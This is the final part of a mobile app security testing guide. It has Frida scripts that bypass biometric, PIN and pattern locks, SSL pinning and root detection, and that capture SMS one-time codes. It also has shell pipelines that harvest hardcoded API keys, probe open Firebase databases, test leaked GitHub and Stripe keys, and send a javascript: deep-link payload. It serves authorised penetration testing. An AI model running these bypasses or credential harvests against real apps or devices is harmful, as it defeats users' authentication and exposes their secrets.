echo "Firestore:"; curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents" | head -50

API_KEY=$(grep -rnoP 'AIza[0-9A-Za-z-_]{35}' decompiled_sources/ | head -1 | grep -oP 'AIza[0-9A-Za-z-_]{35}')
echo "Remote Config:"; curl -s "https://firebaseremoteconfig.googleapis.com/v1/projects/$PROJECT/remoteConfig" -H "Authorization: Bearer $API_KEY" | head -50
```

---

## 14. Frida Instrumentation Scripts

### 14.1 Method Tracing

```javascript
Java.perform(function() {
    function traceClass(targetClass) {
        var hook = Java.use(targetClass);
        var methods = hook.class.getDeclaredMethods();
        hook.$dispose;

        methods.forEach(function(method) {
            var methodName = method.getName();
            var overloads = hook[methodName].overloads;
            overloads.forEach(function(overload) {
                overload.implementation = function() {
                    var args = Array.prototype.slice.call(arguments);
                    console.log('[' + targetClass + '] ' + methodName + '(' +
                        args.map(function(a) { return a ? a.toString() : 'null'; }).join(', ') + ')');
                    return this[methodName].apply(this, arguments);
                };
            });
        });
    }
    // traceClass('okhttp3.OkHttpClient');
    // traceClass('com.example.app.network.ApiClient');
});
```

### 14.2 String Search in Memory

```javascript
setTimeout(function() {
    Java.perform(function() {
        Process.enumerateModules().forEach(function(module) {
            var results = Memory.scanSync(module.base, module.size, 'https://');
            if (results.length > 0) {
                console.log('[Module] ' + module.name);
                results.forEach(function(m) {
                    var str = m.address.readUtf8String(200);
                    if (str && str.match(/https?:\\/\\//)) console.log('  URL: ' + str.substring(0, 150));
                });
            }
        });
    });
}, 2000);
```

### 14.3 Bypass Biometric Authentication

```javascript
Java.perform(function() {
    try {
        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
        BiometricPrompt.authenticate.overload(
            'androidx.biometric.BiometricPrompt$PromptInfo',
            'androidx.biometric.BiometricPrompt$CryptoObject'
        ).implementation = function(promptInfo, crypto) {
            console.log('[Biometric] Bypassed');
            return;
        };
    } catch(e) {}

    try {
        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {
            console.log('[Fingerprint] Bypassed');
            return;
        };
    } catch(e) {}

    try {
        var KeyguardManager = Java.use('android.app.KeyguardManager');
        KeyguardManager.isKeyguardSecure.implementation = function() { return false; };
    } catch(e) {}
});
```

### 14.4 Intercept AES/Crypto Operations

```javascript
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[Cipher] Input (' + input.length + ' bytes)');
        var ret = this.doFinal(input);
        console.log('[Cipher] Output (' + ret.length + ' bytes)');
        return ret;
    };

    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algorithm) {
        console.log('[SecretKeySpec] Algorithm: ' + algorithm + ', Key length: ' + key.length);
        return this.$init(key, algorithm);
    };
});
```

### 14.5 Bypass PIN/Pattern Lock

```javascript
Java.perform(function() {
    var LockPatternUtils = Java.use('com.android.internal.widget.LockPatternUtils');
    LockPatternUtils.checkPattern.implementation = function(pattern) { return true; };
    LockPatternUtils.checkPassword.implementation = function(password) { return true; };
});
```

### 14.6 Override Date/Time for Token Bypass

```javascript
Java.perform(function() {
    var System = Java.use('java.lang.System');
    System.currentTimeMillis.implementation = function() { return 1700000000000; };

    var Date = Java.use('java.util.Date');
    Date.$init.overload().implementation = function() { return this.$init(1700000000000); };
});
```

### 14.7 Dynamic Class & Method Dump

```javascript
Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (!className.startsWith('android.') && !className.startsWith('java.') &&
                !className.startsWith('javax.') && !className.startsWith('kotlin.'))
                console.log('[CLASS] ' + className);
        },
        onComplete: function() { console.log('[Enum] Complete'); }
    });
});
```

### 14.8 OTP/SMS Verification Bypass

```javascript
Java.perform(function() {
    try {
        var SmsMessage = Java.use('android.telephony.SmsMessage');
        SmsMessage.createFromPdu.implementation = function(pdu) {
            var msg = this.createFromPdu(pdu);
            if (msg) {
                console.log('[SMS] From: ' + msg.getOriginatingAddress());
                console.log('[SMS] Body: ' + msg.getMessageBody());
            }
            return msg;
        };
    } catch(e) {}
});
```

---

## 15. Burp Proxy Setup for Mobile Traffic

### 15.1 Android Emulator Proxy Setup

```bash
adb shell settings put global http_proxy 10.0.2.2:8080
# 10.0.2.2 maps to host localhost from emulator
```

### 15.2 Android Physical Device Proxy Setup

```bash
adb shell settings put global http_proxy <host-ip>:8080
adb shell settings put global http_proxy :0  # remove proxy
adb shell settings get global http_proxy     # check
```

### 15.3 Install Burp CA Certificate on Android (Root)

```bash
# Export Burp CA cert as DER format from Burp -> Proxy -> Options -> Export CA certificate
adb push cacert.der /sdcard/Download/

# Install as system CA (root required)
adb root
adb remount
HASH=$(openssl x509 -inform DER -in cacert.der -subject_hash_old -noout)
cp cacert.der $HASH.0
adb push $HASH.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/$HASH.0
adb reboot
```

### 15.4 Install Burp CA via Magisk

```bash
# Install MoveCert or TrustMeAlready Magisk module
openssl x509 -inform DER -in cacert.der -out cacert.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
cp cacert.pem $HASH.0
adb push $HASH.0 /sdcard/Download/
# MoveCert picks it up from there
```

### 15.5 Android 7+ Network Security Config Bypass

```bash
# Android 7+ ignores user CAs by default
# Patch APK with custom network_security_config.xml:
unzip app.apk -d patched_apk/
mkdir -p patched_apk/res/xml/
```

Create `res/xml/network_security_config.xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

Add `android:networkSecurityConfig="@xml/network_security_config"` to `<application>` in manifest.

### 15.6 iOS HTTPS Proxy Setup

```bash
# Settings -> Wi-Fi -> (i) -> HTTP Proxy -> Manual
# Server: <burp-ip>, Port: 8080

# Install Burp CA on iOS:
# 1. Export Burp cert as DER
# 2. Email/serve to device
# 3. Install profile: Settings -> General -> Profiles
# 4. Enable trust: Settings -> General -> About -> Certificate Trust Settings -> Enable
```

---

## 16. iOS Analysis Without Jailbreak

### 16.1 Frida on Non-Jailbroken Device

```bash
# Prerequisites: Xcode, Apple Developer account, Frida on host

# Download Frida Gadget for iOS
# https://github.com/frida/frida/releases

# Inject Frida Gadget into IPA
unzip app.ipa -d ipa_extracted/
mkdir -p ipa_extracted/Payload/ExampleApp.app/Frameworks/
cp frida-gadget.dylib ipa_extracted/Payload/ExampleApp.app/Frameworks/
insert_dylib --inplace --all-yes @executable_path/Frameworks/frida-gadget.dylib ipa_extracted/Payload/ExampleApp.app/ExampleApp

# Repack IPA
cd ipa_extracted && zip -qr ../app_patched.ipa Payload/

# Sign with Apple Developer cert
# codesign -f -s "iPhone Developer" --entitlements entitlements.plist ipa_extracted/Payload/ExampleApp.app/
```

### 16.2 Dump IPA from Non-Jailbroken Device

```bash
# Using Apple Configurator 2 (macOS)
# 1. Connect device -> Add -> Apps -> Choose app
# 2. IPA at: ~/Library/Group Containers/.../Caches/Assets/TemporaryItems/

# Using iMazing (paid, cross-platform)
# Right-click app -> Export IPA

# Using ipatool-py
pip install ipatool-py
ipatool download -b com.example.app -o app.ipa --email <apple-id>
```

### 16.3 Analyze IPA Binary Statically

```bash
unzip App_name.ipa -d ipa_content/
BINARY=$(ls ipa_content/Payload/*.app/ | grep -vE '\\.(dylib|framework|plist|png|lproj|storyboardc|nib|xib|car|jpg|jpeg|gif|svg|pdf|wav|mp3|mp4|ttf|otf)' | head -1)
echo "Binary: $BINARY"

lipo -info "ipa_content/Payload/*.app/$BINARY"
class-dump "ipa_content/Payload/*.app/$BINARY" -H -o headers/
strings "ipa_content/Payload/*.app/$BINARY" > binary_strings.txt
```

### 16.4 iOS Simulator Analysis

```bash
xcrun simctl install booted app.ipa
xcrun simctl launch booted com.example.app
xcrun simctl spawn booted log stream --style json | grep com.example.app
frida -U com.example.app -l script.js
```

### 16.5 iOS App Data Extraction (Non-Jailbroken)

```bash
idevicesyslog | grep -iE '(token|password|secret|api|auth|error|crash)'
ideviceinstaller -l

# Analyze backups
idevicebackup2 backup --full ./backup_folder
cd backup_folder
sqlite3 Manifest.db "SELECT fileID, relativePath FROM Files WHERE domain LIKE '%AppDomain-com.example.app%'"
```

### 16.6 iOS Network Logging (Without Jailbreak)

```bash
# Using rvictl (requires Xcode)
rvictl -s <udid>
sudo tcpdump -i rvi0 -w ios_traffic.pcap
wireshark ios_traffic.pcap
rvictl -x <udid>
```

---

## 17. Complete Mobile Testing Workflows

### 17.1 Full Android APK Security Assessment

```bash
# === PHASE 1: ACQUISITION ===
apkeep -a com.example.app .
adb shell pm path com.example.app
adb pull /data/app/com.example.app-*/base.apk app.apk
aapt dump badging app.apk > app_info.txt
aapt dump permissions app.apk > permissions.txt

# === PHASE 2: DECOMPILATION ===
jadx -d jadx_output/ app.apk --show-bad-code --verbose
apktool d app.apk -o apktool_output/

# === PHASE 3: RECONNAISSANCE ===
grep -rnoP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,200}' jadx_output/ | sort -u > endpoints.txt
grep -rnoP '(AIza[0-9A-Za-z-_]{35}|AKIA[0-9A-Z]{16}|gh[psu]_[A-Za-z0-9_]{36,}|xox[baprs]-[0-9a-zA-Z-]{10,})' jadx_output/ > secrets.txt
grep -rnoP 'https?://[a-zA-Z0-9-]+\\.firebaseio\\.com' jadx_output/ > firebase_urls.txt

# === PHASE 4: VULNERABILITY ANALYSIS ===
grep -rn '(addJavascriptInterface|setJavaScriptEnabled|loadUrl|shouldOverrideUrlLoading)' jadx_output/ > webview_audit.txt
grep -B2 'exported="true"' apktool_output/AndroidManifest.xml > exported_components.txt
grep -rniE '(pinning|certificatePinner|sslPinning)' jadx_output/

# === PHASE 5: DYNAMIC ANALYSIS ===
adb install app.apk
adb shell settings put global http_proxy 192.168.1.100:8080
frida -U -f com.example.app -l universal-ssl-bypass.js --no-pause
adb logcat -c && adb logcat com.example.app:D *:S
```

### 17.2 Android Endpoint & Secret Extraction Script

```bash
APK="$1"
OUTDIR="scan_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

jadx -d "$OUTDIR/jadx" "$APK" --show-bad-code 2>/dev/null

grep -rnoP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,200}' "$OUTDIR/jadx" \
  | grep -oP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' | sort -u > "$OUTDIR/domains.txt"

grep -rnoP '@(GET|POST|PUT|DELETE|PATCH)\\s*\\(\\s*"[^"]*"\\)' "$OUTDIR/jadx" > "$OUTDIR/api_annotations.txt" 2>/dev/null

grep -rnoP '(AIza[0-9A-Za-z-_]{35}|AKIA[0-9A-Z]{16}|gh[psu]_[A-Za-z0-9_]{36,}|xox[baprs]-[0-9a-zA-Z-]{10,})' "$OUTDIR/jadx" > "$OUTDIR/secrets.txt" 2>/dev/null

for url in $(grep -oP 'https://[a-zA-Z0-9-]+\\.firebaseio\\.com' "$OUTDIR/jadx" 2>/dev/null); do
  echo -n "$url -> "; curl -s -o /dev/null -w "%{http_code}" "$url/.json"; echo ""
done > "$OUTDIR/firebase_test.txt"

echo "Results in: $OUTDIR/"
```

### 17.3 iOS Full Assessment Script

```bash
IPA="$1"

unzip -q "$IPA" -d ipa_extracted/
BUNDLE_DIR=$(ls ipa_extracted/Payload/ | head -1)
BINARY=$(ls "ipa_extracted/Payload/$BUNDLE_DIR/" | grep -vE '\\.(dylib|framework|plist|png|lproj)' | head -1)

echo "=== Info.plist Analysis ==="
plutil -p "ipa_extracted/Payload/$BUNDLE_DIR/Info.plist" | grep -iE '(url|scheme|key|token|api|ATS|NSAppTransport)'

echo "=== Binary Strings (Security) ==="
strings "ipa_extracted/Payload/$BUNDLE_DIR/$BINARY" | grep -iE '(https?://|api|secret|token|password|key|jwt|auth)' | sort -u > strings_security.txt

echo "=== Endpoints ==="
grep -oiP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,200}' strings_security.txt | sort -u > endpoints.txt

class-dump "ipa_extracted/Payload/$BUNDLE_DIR/$BINARY" -H -o headers/ 2>/dev/null
echo "Complete."
```

### 17.4 Frida Dynamic Analysis Script

```javascript
Java.perform(function() {
    console.log('=== Frida Dynamic Analysis ===');

    // 1. Bypass SSL pinning
    try {
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
        .implementation = function(keyManagers, trustManagers, secureRandom) {
            var TrustAll = Java.registerClass({
                name: 'com.frida.TrustAll',
                implements: [Java.use('javax.net.ssl.X509TrustManager')],
                methods: {
                    checkClientTrusted: function(c, t) {},
                    checkServerTrusted: function(c, t) { console.log('[SSL] Trusted: ' + c[0].getSubjectDN().getName()); },
                    getAcceptedIssuers: function() { return []; }
                }
            });
            console.log('[1/4] SSL pinning bypassed');
            return this.init(keyManagers, [TrustAll.$new()], secureRandom);
        };
    } catch(e) { console.log('[1/4] SSL bypass unavailable: ' + e.message); }

    // 2. Intercept network calls
    try {
        var URL = Java.use('java.net.URL');
        URL.openConnection.implementation = function() {
            console.log('[2/4] Network call: ' + this.toString());
            return this.openConnection();
        };
    } catch(e) {}

    // 3. Bypass root detection
    try {
        var File = Java.use('java.io.File');
        var origExists = File.exists.implementation;
        File.exists.implementation = function() {
            var path = this.getAbsolutePath();
            if (['/su', '/sbin/su', '/system/bin/su', '/system/xbin/su'].indexOf(path) >= 0) return false;
            return origExists.call(this);
        };
        console.log('[3/4] Root detection bypassed');
    } catch(e) {}

    // 4. Enumerate application classes
    console.log('[4/4] Enumerating application classes...');
    Java.enumerateLoadedClasses({
        onMatch: function(c) { if (!c.startsWith('android.') && !c.startsWith('java.')) console.log('[CLASS] ' + c); },
        onComplete: function() { console.log('=== Analysis Complete ==='); }
    });
});
```

```bash
frida -U -f com.example.app -l full-dynamic.js --no-pause -o analysis.log
```

### 17.5 Mobile API Security Checklist

```markdown
## Pre-Assessment
- [ ] Acquire APK/IPA from device or store
- [ ] Verify APK integrity and signature

## Static Analysis
- [ ] Decompile with jadx
- [ ] List all permissions from manifest
- [ ] Identify exported components
- [ ] Extract API endpoints from decompiled code
- [ ] Search for hardcoded secrets, keys, tokens
- [ ] Identify Firebase databases and project IDs
- [ ] Check WebView configuration (JS bridge, file access)
- [ ] Check SSL pinning implementation
- [ ] Review deep link / URL scheme handlers
- [ ] Review iOS ATS configuration

## Network Analysis
- [ ] Set up Burp proxy with CA certificate
- [ ] Bypass SSL pinning (Frida/objection)
- [ ] Intercept and map all API traffic
- [ ] Test auth mechanisms (token handling, replay)
- [ ] Test authorization (IDOR, privilege escalation)
- [ ] Test rate limiting and input validation

## Data Storage
- [ ] Check SharedPreferences/NSUserDefaults for sensitive data
- [ ] Check SQLite/CoreData databases
- [ ] Check iOS Keychain accessibility
- [ ] Attempt backup extraction

## Deep Link Testing
- [ ] Fuzz deep link parameters for injection
- [ ] Test intent injection
- [ ] Test file:// access in WebView
- [ ] Test javascript: scheme in deep links

## Authentication Bypass
- [ ] Bypass biometric/PIN lock
- [ ] Bypass root/jailbreak detection
- [ ] Bypass SSL pinning
- [ ] Test token manipulation and replay

## Firebase Testing
- [ ] Test open database access (read/write/delete)
- [ ] Test Cloud Functions auth
- [ ] Test Firebase Storage rules
- [ ] Test Auth API key

## Reporting
- [ ] Document findings with CVSS 3.1
- [ ] Include repro steps and PoC
```

### 17.6 Automated APK Pipeline

```bash
#!/bin/bash
APK="$1"
BASE_DIR="mobile_test_$(basename "$APK" .apk)"
mkdir -p "$BASE_DIR" && cd "$BASE_DIR"

echo "[1/6] APK Info"
aapt dump badging "../$APK" > badging.txt
aapt dump permissions "../$APK" > permissions.txt

echo "[2/6] Decompile"
jadx -d jadx_output "../$APK" --show-bad-code 2>/dev/null
apktool d "../$APK" -o apktool_output 2>/dev/null

echo "[3/6] Endpoint extraction"
grep -rnoP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,200}' jadx_output/ \
  | grep -oP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' | sort -u > endpoints.txt

echo "[4/6] Secret scanning"
grep -rnoP '(AIza[0-9A-Za-z-_]{35}|AKIA[0-9A-Z]{16}|gh[psu]_[A-Za-z0-9_]{36,})' jadx_output/ > secrets.txt 2>/dev/null

echo "[5/6] Firebase discovery"
grep -rnoP 'https?://[a-zA-Z0-9-]+\\.firebaseio\\.com' jadx_output/ > firebase.txt 2>/dev/null

echo "[6/6] WebView analysis"
grep -rn 'addJavascriptInterface|setJavaScriptEnabled' jadx_output/ > webview_audit.txt 2>/dev/null

echo "Results in $BASE_DIR/"
echo "  badging.txt, permissions.txt, endpoints.txt"
echo "  secrets.txt, firebase.txt, webview_audit.txt"
```

### 17.7 Quick Mobile Recon (30 min)

```bash
# 30-minute mobile quick recon

# 1. APK Info (2 min)
aapt dump badging app.apk | grep -E '(package|version|debuggable|sdkVersion)'

# 2. Permissions (2 min)
aapt dump permissions app.apk | grep -iE '(CAMERA|MICROPHONE|RECORD_AUDIO|READ_CONTACTS|ACCESS_FINE_LOCATION|READ_SMS|RECEIVE_SMS|READ_EXTERNAL_STORAGE|SYSTEM_ALERT_WINDOW)'

# 3. Decompile & grep endpoints (5 min)
jadx -d jadx/ app.apk --show-bad-code 2>/dev/null
grep -rnoP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,100}' jadx/ | grep -oP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' | sort -u > endpoints.txt
echo "Endpoints: $(wc -l < endpoints.txt)"

# 4. Quick secrets (3 min)
grep -rnoP '(?i)(api[_-]key|apikey|secret|token|password|jwt|bearer).{0,30}["\'"'"'"'"']([A-Za-z0-9+/=_\\-]{8,60})["\'"'"'"'"']' jadx/ | head -20

# 5. Exported components (2 min)
apktool d app.apk -o apk/ 2>/dev/null
grep -B2 'exported="true"' apk/AndroidManifest.xml | head -20

# 6. WebView check (2 min)
grep -rn 'addJavascriptInterface|setJavaScriptEnabled' jadx/ | head -10

# 7. Firebase check (2 min)
for url in $(grep -oP 'https://[a-zA-Z0-9-]+\\.firebaseio\\.com' jadx/); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$url/.json")
  echo "  $url -> $status"
done
```

### 17.8 Token/Key Validation

```bash
# Google API Key
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=AIza..."

# Firebase API Key
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIza..." \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"Test123!","returnSecureToken":true}'

# JWT Decode
echo "$JWT" | cut -d. -f1,2 | base64 -d 2>/dev/null

# GitHub Token
curl -s -H "Authorization: token ghp_..." "https://api.github.com/user"

# Stripe Key
curl -s "https://api.stripe.com/v1/charges" -u "sk_test_...:"
```

### 17.9 OWASP MASVS Checklist (L1)

```markdown
- [ ] MASVS-STORAGE-1: Secure credential storage
- [ ] MASVS-STORAGE-2: No sensitive data in logs
- [ ] MASVS-CRYPTO-1: Cryptography implementation
- [ ] MASVS-AUTH-1: Authentication requirements
- [ ] MASVS-NETWORK-1: Secure network communication
- [ ] MASVS-PLATFORM-1: Platform interaction
- [ ] MASVS-CODE-1: Code quality
- [ ] MASVS-RESILIENCE-1: Tamper resistance
```

### 17.10 Quick Commands Reference

```bash
# ACQUISITION
apkeep -a com.example.app .
adb shell pm path com.example.app
adb pull /data/app/com.example.app-*/base.apk

# INFO
aapt dump badging app.apk
aapt dump permissions app.apk
apksigner verify --print-certs app.apk

# DECOMPILE
jadx -d out/ app.apk
apktool d app.apk -o out/

# ENDPOINTS
grep -rnoP 'https?://[^"'"'"'\\s)]+' jadx_out/
grep -rnoP '@(GET|POST|PUT|DELETE|PATCH)\\(\\s*"[^"]*"\\)' jadx_out/

# SECRETS
grep -rnoP 'AIza[0-9A-Za-z-_]{35}' jadx_out/
grep -rnoP 'AKIA[0-9A-Z]{16}' jadx_out/
grep -rnoP 'gh[psu]_[A-Za-z0-9_]{36,}' jadx_out/

# FIREBASE
grep -rnoP 'https?://[^"'"'"']+\\.firebaseio\\.com' jadx_out/
curl -s "https://<project>.firebaseio.com/.json"

# WEBVIEW
grep -rn 'addJavascriptInterface' jadx_out/
grep -rn 'setJavaScriptEnabled' jadx_out/
grep -rn 'onReceivedSslError' jadx_out/

# EXPORTED COMPONENTS
grep -B2 'exported="true"' apktool_out/AndroidManifest.xml

# DEEP LINKS
adb shell am start -d "exampleapp://test" -n com.example.app/.MainActivity
adb shell am start -d "exampleapp://webview?url=javascript:alert(1)" -n com.example.app/.WebViewActivity

# SSL PINNING BYPASS
frida -U -f com.example.app -l universal-ssl-bypass.js --no-pause
objection explore -g com.example.app --startup-command "android sslpinning disable"

# BURP PROXY
adb shell settings put global http_proxy 10.0.2.2:8080
adb shell settings put global http_proxy :0

# FRIDA
frida -U com.example.app -l script.js
frida -U -f com.example.app -l script.js --no-pause

# CONTENT PROVIDERS
adb shell content query --uri content://com.example.app.provider/users/
adb shell content query --uri content://com.example.app.provider/ --where "1=1"

# BACKUP
adb backup -f backup.ab com.example.app
( printf "\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00" ; tail -c +25 backup.ab ) | tar xz

# iOS
unzip app.ipa -d ipa_content/
plutil -p ipa_content/Payload/*.app/Info.plist
class-dump -H ipa_content/Payload/*.app/<Binary> -o headers/
strings ipa_content/Payload/*.app/<Binary> | grep -iE '(https?://|secret|token|key)'
xcrun simctl install booted app.ipa
```

---

*End of Mobile App Security Testing Rules*
